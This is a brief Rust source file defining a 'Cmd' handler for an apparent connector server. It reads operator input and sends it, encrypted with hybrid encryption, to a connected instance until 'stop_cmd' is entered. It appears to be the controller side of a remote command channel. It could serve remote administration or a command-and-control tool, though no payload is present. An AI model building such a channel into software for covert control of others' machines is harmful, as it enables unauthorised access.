use crate::{connector_server::instance::Instance, server_cli};

#[derive(Debug, Clone)]
pub struct Cmd {
    name: String,
}

impl Cmd {
    pub fn new() -> Cmd {
        Cmd {
            name: "cmd".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }
    pub async fn run(&self, instance: &mut Instance) {
        let command = server_cli::handle_user_input().await;

        let public_key = instance.get_public_key();
        instance
            .send_hybrid_encryption(public_key, command.as_bytes().to_vec())
            .await;
        if command == "stop_cmd" {
            return;
        }
    }
}
